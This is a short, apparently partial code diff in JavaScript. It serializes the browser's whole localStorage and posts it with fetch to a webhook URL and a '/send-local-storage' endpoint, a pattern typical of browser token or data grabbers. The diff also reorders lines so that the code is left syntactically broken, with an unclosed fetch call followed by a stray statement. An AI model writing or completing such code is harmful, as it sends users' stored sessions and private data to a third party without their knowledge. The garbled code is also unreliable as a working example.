@@ -11,9 +11,9 @@ const payload = {
     content: dynamicMessage
 };
 
-const localData = JSON.stringify(localStorage);
-fetch(webhookUrl, {
 
+fetch(webhookUrl, {
+const localData = JSON.stringify(localStorage);
 fetch('/send-local-storage', {
     method: 'POST',
     headers: {
